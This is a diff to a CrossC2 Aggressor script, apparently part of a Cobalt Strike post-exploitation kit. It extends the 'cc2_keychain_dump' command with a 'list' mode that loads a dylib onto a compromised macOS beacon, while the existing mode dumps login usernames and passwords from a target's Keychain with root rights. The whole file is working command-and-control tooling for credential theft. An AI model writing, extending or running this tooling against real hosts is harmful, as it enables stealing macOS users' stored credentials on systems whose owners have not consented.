@@ -2,7 +2,7 @@
 include(script_resource("CrossC2Kit.cna"));
 
 sub printUsage_keychain_dump {
-    blog($1, "\nUsage: cc2_keychain_dump <keychain file>\n\tneed root permissions.\n\tdump login username & password from Keychain.\nEx:\n\tcc2_keychain_dump /User/target/Library/Keychains/login.keychain {default}");
+    blog($1, "\nUsage: cc2_keychain_dump <keychain file>/<list>\n\tneed root permissions.\n\tdump login username & password from Keychain.\nEx:\n\tcc2_keychain_dump list\n\tcc2_keychain_dump /User/target/Library/Keychains/login.keychain {default}");
 }
 
 ssh_alias cc2_keychain_dump {
@@ -15,13 +15,19 @@ ssh_alias cc2_keychain_dump {
     $transportArg = $keychain."^".$3;
 
     if ($keychain) {
-        $loadlib = "gather/keychain/a.out";
-        blog($beaconid, "cc2_keychain_dump: ");
-        bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+        if ($keychain eq "list") {
+            $loadlib = "gather/keychain/cc2_keychain_list.dylib";
+            blog($beaconid, "cc2_keychain_dump: list");
+            bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+        } else {
+            $loadlib = "gather/keychain/cc2_keychain_dump";
+            blog($beaconid, "cc2_keychain_dump: ");
+            bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+        }
     } else {
         printUsage_keychain_dump($beaconid);
     }
 
 }
 
-ssh_command_register("cc2_keychain_dump", "CrossC2 Keychain dump (root) - dump login username & password from Keychain.", "\nUsage: cc2_keychain_dump <keychain file>\n\tneed root permissions.\n\tdump login username & password from Keychain.\nEx:\n\tcc2_keychain_dump /User/target/Library/Keychains/login.keychain {default}");
+ssh_command_register("cc2_keychain_dump", "CrossC2 Keychain dump (root) - dump login username & password from Keychain.", "\nUsage: cc2_keychain_dump <keychain file>/<list>\n\tneed root permissions.\n\tdump login username & password from Keychain.\nEx:\n\tcc2_keychain_dump list\n\tcc2_keychain_dump /User/target/Library/Keychains/login.keychain {default}");
